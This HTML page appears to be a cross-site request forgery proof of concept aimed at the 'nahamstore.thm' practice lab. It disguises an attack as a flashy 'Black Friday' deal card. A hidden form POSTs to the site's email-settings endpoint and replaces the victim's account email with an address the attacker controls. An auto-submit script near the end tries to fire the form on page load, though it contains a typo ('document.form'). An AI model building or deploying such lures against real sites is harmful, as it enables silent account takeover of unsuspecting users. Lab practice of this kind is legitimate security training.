
<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">

	<style>
		* {
			box-sizing: border-box;
		}

		body {
			margin: 0;
			min-height: 100vh;
			display: flex;
			align-items: center;
			justify-content: center;
			overflow: hidden;
			font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
			color: white;
			background:
				radial-gradient(ellipse at 15% 5%, #6d450e55, transparent 38%),
				radial-gradient(ellipse at 90% 85%, #8b111f44, transparent 35%),
				#070707;
		}

		body::before {
			content: "";
			position: fixed;
			inset: 0;
			background-image:
				linear-gradient(#ffffff08 1px, transparent 1px),
				linear-gradient(90deg, #ffffff08 1px, transparent 1px);
			background-size: 42px 42px;
			pointer-events: none;
		}

		/* Fitas douradas */
		body::after {
			content: "BLACK FRIDAY  ✦  LIMITED EDITION  ✦  BLACK FRIDAY";
			position: fixed;
			z-index: 0;
			top: 16%;
			left: -20%;
			width: 140%;
			padding: 20px 0;
			text-align: center;
			font-size: 13px;
			font-weight: 900;
			letter-spacing: 6px;
			color: #6b2805;
			background: linear-gradient(
				180deg,
				#fff0a1,
				#ffca3a 30%,
				#e99a12 65%,
				#ffdf70
			);
			box-shadow:
				0 12px 35px #0009,
				inset 0 2px 2px #ffffffaa,
				inset 0 -3px 3px #8c5105;
			transform: rotate(-12deg);
			pointer-events: none;
			animation: ribbonGlow 5s ease-in-out infinite alternate;
		}

		/* Fita vermelha cruzada */
		.ribbon {
			position: fixed;
			z-index: 1;
			top: 27%;
			left: -20%;
			width: 140%;
			padding: 18px 0;
			text-align: center;
			white-space: nowrap;
			font-size: 12px;
			font-weight: 900;
			letter-spacing: 5px;
			color: #650d17;
			background: linear-gradient(
				180deg,
				#ffb2b5,
				#ff4c59 25%,
				#ed1e32 60%,
				#a90c22
			);
			box-shadow:
				0 12px 35px #0009,
				inset 0 2px 2px #ffffff80;
			transform: rotate(8deg);
			pointer-events: none;
			animation: ribbonFloat 7s ease-in-out infinite alternate;
		}

		form {
			position: relative;
			z-index: 2;
			width: min(440px, calc(100% - 40px));
			padding: 48px 32px;
			text-align: center;
			border: 1px solid #ffffff45;
			border-radius: 28px;
			background: linear-gradient(
				135deg,
				#ffffff1b,
				#ffffff06 45%,
				#ffffff12
			);
			backdrop-filter: blur(24px) saturate(140%);
			-webkit-backdrop-filter: blur(24px) saturate(140%);
			box-shadow:
				0 35px 100px #000a,
				inset 0 1px 1px #ffffff65,
				0 0 50px #ffc34218;
			animation: cardEnter 1s cubic-bezier(.2,.8,.2,1) both;
		}

		form::before {
			content: "LIMITED EDITION";
			display: inline-block;
			margin-bottom: 24px;
			padding: 8px 13px;
			border: 1px solid #ffd87588;
			border-radius: 30px;
			color: #ffe5a0;
			font-size: 10px;
			font-weight: 700;
			letter-spacing: 3px;
		}

		form::after {
			content: "BLACK FRIDAY  ·  SPECIAL EDITION";
			display: block;
			margin-top: 25px;
			color: #a5a5ad;
			font-size: 9px;
			letter-spacing: 3px;
		}

		input[type="submit"] {
			width: 100%;
			padding: 17px 22px;
			border: 1px solid #fff0a2;
			border-radius: 15px;
			background: linear-gradient(
				110deg,
				#ffe16b,
				#ffb629 40%,
				#ff583d
			);
			color: #231407;
			font-size: 14px;
			font-weight: 800;
			letter-spacing: .5px;
			cursor: pointer;
			box-shadow:
				0 8px 25px #ff9d2733,
				inset 0 1px 1px #ffffffd9;
			transition:
				transform .3s ease,
				box-shadow .3s ease,
				filter .3s ease;
		}

		input[type="submit"]:hover {
			transform: translateY(-3px) scale(1.015);
			filter: brightness(1.1);
			box-shadow:
				0 12px 35px #ff9d2766,
				0 0 35px #ffcc3d35;
		}

		input[type="submit"]:active {
			transform: scale(.985);
		}

		input[type="submit"]:focus-visible {
			outline: 2px solid white;
			outline-offset: 5px;
		}

		@keyframes cardEnter {
			from {
				opacity: 0;
				transform: translateY(25px) scale(.97);
			}
			to {
				opacity: 1;
				transform: translateY(0) scale(1);
			}
		}

		@keyframes ribbonGlow {
			from { filter: brightness(.9); }
			to { filter: brightness(1.12); }
		}

		@keyframes ribbonFloat {
			from { margin-top: -8px; }
			to { margin-top: 8px; }
		}

		@media (max-width: 600px) {
			form {
				padding: 38px 24px;
			}

			.ribbon {
				font-size: 9px;
				letter-spacing: 3px;
			}
		}

		@media (prefers-reduced-motion: reduce) {
			*, *::before, *::after {
				animation: none !important;
				transition: none !important;
			}
		}
	</style>
</head>

<body>
	<div class="ribbon" aria-hidden="true">
		EXCLUSIVE DEALS ✦ BLACK FRIDAY ✦ LIMITED OFFER
	</div>

	<form method="POST" action="http://nahamstore.thm/account/settings/email">
		<input type="hidden" name="change_email" value="angola123@angola123.com">
		<input type="submit" value="Submit Request">
	</form>
</body>

            <script>
                document.form[0].submit();
            </script>
</html>
